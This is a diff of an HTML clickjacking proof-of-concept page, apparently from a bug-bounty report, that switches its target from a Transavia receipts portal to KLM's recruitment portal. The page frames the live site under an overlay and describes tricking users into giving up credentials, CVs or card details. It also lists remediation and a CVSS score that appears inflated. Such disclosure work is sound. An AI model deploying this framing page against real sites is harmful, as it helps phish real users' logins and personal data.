@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clickjacking PoC by ph4ntom404 - Transavia Receipts Portal</title>
+    <title>Clickjacking PoC by ph4ntom404 - KLM Recruitment Portal</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -34,7 +34,7 @@
         .iframe-container {
             position: relative;
             width: 100%;
-            height: 800px;
+            height: 900px; 
             border: 2px solid #007bff;
             border-radius: 4px;
             overflow: hidden;
@@ -75,8 +75,8 @@
 </head>
 <body>
     <div class="container">
-        <h1>🔒 Clickjacking Vulnerability PoC By Ph4ntom404</h1>
-        <h2>Target: Transavia Receipts Portal (Connected Crew Paperless Receipts)</h2>
+        <h1>🔒 Clickjacking Vulnerability PoC</h1>
+        <h2>Target: KLM Recruitment Portal</h2>
         
         <div class="warning">
             <strong>⚠️ WARNING:</strong> This is a proof of concept demonstration only. 
@@ -90,13 +90,13 @@
         </div>
         
         <h3>Demonstration</h3>
-        <p>The iframe below shows the Transavia Receipts Portal embedded in this page. 
-        In a real attack, an attacker could overlay malicious content over the iframe to trick users into entering sensitive flight and payment details.</p>
+        <p>The iframe below shows the KLM Recruitment login portal embedded in this page. 
+        In a real attack, an attacker could overlay malicious content over the iframe to trick users into entering credentials or submitting personal data.</p>
         
         <div class="iframe-container">
-            <iframe src="https://receipts.transavia.fr/#/" 
-                    title="Transavia Receipts Portal"
-                    sandbox="allow-same-origin allow-scripts allow-forms">
+            <iframe src="https://recruitment.klm.com/" 
+                    title="KLM Recruitment Portal"
+                    sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation">
             </iframe>
             <div class="overlay"></div>
         </div>
@@ -105,10 +105,10 @@
             <h4>📋 Attack Scenario</h4>
             <ol>
                 <li>Attacker creates a malicious page with the target embedded in an iframe</li>
-                <li>Attacker overlays transparent or deceptive content over the iframe (e.g., a fake "Claim Refund" button)</li>
-                <li>User thinks they're interacting with a legitimate Transavia page</li>
-                <li>User enters sensitive details (flight number, departure date, last 4 digits of card) without realizing</li>
-                <li>Attacker captures the submitted data or misuses the form</li>
+                <li>Attacker overlays transparent or deceptive content over the iframe (e.g., a fake "Submit Application" or "Sign In for Exclusive Jobs" button)</li>
+                <li>User thinks they're interacting with a legitimate KLM careers page</li>
+                <li>User enters login credentials, personal details, or uploads CV without realizing</li>
+                <li>Attacker captures the submitted data or hijacks the session</li>
             </ol>
             
             <h4>🛡️ Remediation</h4>
@@ -120,17 +120,17 @@
             
             <h4>📊 Impact</h4>
             <ul>
-                <li>Phishing attacks targeting flight and payment details</li>
-                <li>Theft of personal identifiable information (PII) and travel data</li>
-                <li>User deception and privacy breaches</li>
-                <li>Potential social engineering or indirect account compromise</li>
-                <li>Erosion of trust in Transavia/Air France-KLM services</li>
+                <li>Phishing attacks targeting credentials and personal data</li>
+                <li>Theft of sensitive applicant information (PII, CVs, contact details)</li>
+                <li>Account compromise and privacy breaches</li>
+                <li>Potential social engineering or identity theft</li>
+                <li>Erosion of trust in KLM recruitment process</li>
             </ul>
         </div>
         
         <div class="info">
             <h4>🔍 Technical Details</h4>
-            <p><strong>Target URL:</strong> https://receipts.transavia.fr/#/</p>
+            <p><strong>Target URL:</strong> https://recruitment.klm.com/</p>
             <p><strong>Vulnerability:</strong> Missing X-Frame-Options and CSP frame-ancestors headers</p>
             <p><strong>CVSS Score:</strong> 8.8 (High)</p>
             <p><strong>CVSS Vector:</strong> CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</p>
